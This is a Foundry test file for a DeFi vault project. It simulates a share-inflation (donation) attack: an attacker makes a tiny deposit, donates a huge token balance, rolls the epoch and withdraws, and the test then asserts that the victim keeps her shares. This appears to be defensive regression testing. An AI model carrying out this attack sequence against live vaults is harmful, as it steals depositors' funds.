// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UD60x18, ud, convert} from "@prb/math/UD60x18.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "@project/interfaces/IPositionManager.sol";
import {Epoch} from "@project/lib/EpochController.sol";
import {AmountsMath} from "@project/lib/AmountsMath.sol";
import {EpochFrequency} from "@project/lib/EpochFrequency.sol";
import {OptionStrategy} from "@project/lib/OptionStrategy.sol";
import {AddressProvider} from "@project/AddressProvider.sol";
import {MarketOracle} from "@project/MarketOracle.sol";
import {FeeManager} from "@project/FeeManager.sol";
import {Vault} from "@project/Vault.sol";
import {TestnetToken} from "@project/testnet/TestnetToken.sol";
import {TestnetPriceOracle} from "@project/testnet/TestnetPriceOracle.sol";
import {DVPUtils} from "./utils/DVPUtils.sol";
import {TokenUtils} from "./utils/TokenUtils.sol";
import {Utils} from "./utils/Utils.sol";
import {VaultUtils} from "./utils/VaultUtils.sol";
import {MockedIG} from "./mock/MockedIG.sol";
import {MockedRegistry} from "./mock/MockedRegistry.sol";
import {MockedVault} from "./mock/MockedVault.sol";
import {TestnetSwapAdapter} from "@project/testnet/TestnetSwapAdapter.sol";
import {PositionManager} from "@project/periphery/PositionManager.sol";


contract IGVaultTest is Test {
    using AmountsMath for uint256;

    address admin = address(0x1);

    // User of Vault
    address alice = address(0x2);
    address bob = address(0x3);

    //User of DVP
    address charlie = address(0x4);
    address david = address(0x5);

    AddressProvider ap;
    TestnetToken baseToken;
    TestnetToken sideToken;
    FeeManager feeManager;

    MockedRegistry registry;

    MockedVault vault;
    MockedIG ig;
    TestnetPriceOracle priceOracle;
    TestnetSwapAdapter exchange;
    uint _strike;

    function setUp() public {
        vm.warp(EpochFrequency.REF_TS + 1);

        vm.startPrank(admin);
        ap = new AddressProvider(0);
        registry = new MockedRegistry();
        ap.grantRole(ap.ROLE_ADMIN(), admin);
        registry.grantRole(registry.ROLE_ADMIN(), admin);
        ap.setRegistry(address(registry));

        vm.stopPrank();

        vault = MockedVault(VaultUtils.createVault(EpochFrequency.DAILY, ap, admin, vm));
        priceOracle = TestnetPriceOracle(ap.priceOracle());
        console.logAddress(address(priceOracle));

        vm.startPrank(admin);

        baseToken = TestnetToken(vault.baseToken());
        sideToken = TestnetToken(vault.sideToken());
        ig = new MockedIG(address(vault), address(ap));
        ig.grantRole(ig.ROLE_ADMIN(), admin);
        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);
        ig.grantRole(ig.ROLE_TRADER(), charlie);
        vault.grantRole(vault.ROLE_ADMIN(), admin);
        vm.stopPrank();
        ig.setOptionPrice(1e3);
        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1
        ig.useRealDeltaHedge();
        ig.useRealPercentage();
        ig.useRealPremium();

        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);

        vm.prank(admin);
        registry.registerDVP(address(ig));
        vm.prank(admin);
        MockedVault(vault).setAllowedDVP(address(ig));
        feeManager = FeeManager(ap.feeManager());

        exchange = TestnetSwapAdapter(ap.exchangeAdapter());
    }

    function testInflationAttack() public {

        uint256 BT_UNIT = 10 ** baseToken.decimals();
        VaultUtils.addVaultDeposit(bob, BT_UNIT, admin, address(vault), vm);

        Utils.skipDay(true, vm);
        vm.prank(admin);
        ig.rollEpoch();

        VaultUtils.logState(vault);
        assertEq(BT_UNIT, vault.totalSupply());

        (, uint256 heldByVault) = vault.shareBalances(bob);
        vm.prank(bob);
        vault.redeem(heldByVault);

        assertEq(BT_UNIT, vault.balanceOf(bob));


        vm.prank(admin);

        // Other users deposit liquidity (15e18)
        VaultUtils.addVaultDeposit(alice, 10 * BT_UNIT, admin, address(vault), vm);
        VaultUtils.addVaultDeposit(alice, 5 * BT_UNIT, admin, address(vault), vm);

        Utils.skipDay(true, vm);

        // Before rolling an epoch, the attacker donates funds to the vault to trigger rounding
        vm.prank(admin);
        baseToken.mint(bob, 1_000_000_000_000_000_000 * BT_UNIT);
        vm.prank(bob);
        bool transfer = baseToken.transfer(address(vault), 1_000_000_000_000_000_000 * BT_UNIT);
        assert(transfer);

        // Next epoch...
        vm.prank(admin);
        ig.rollEpoch();

        // console.log("SHARE PRICE", vault.epochPricePerShare(ig.getEpoch().previous));

        (, uint256 heldByVaultAliceShares) = vault.shareBalances(alice);
        console.log("heldByVaultAliceShares", heldByVaultAliceShares);
        assertGt(heldByVaultAliceShares, 0);

        (uint256 heldByAccount, ) = vault.shareBalances(bob);
        vm.prank(bob);
        vault.initiateWithdraw(heldByAccount);

        // Next epoch...
        Utils.skipDay(true, vm);
        vm.prank(admin);
        ig.rollEpoch();

        // The attacker withdraws all the funds (donated + stolen)
        vm.prank(bob);
        vault.completeWithdraw();
        assertEq(0, vault.balanceOf(bob));
        assertEq(baseToken.balanceOf(bob), vault.epochPricePerShare(ig.getEpoch().previous));
    }
}
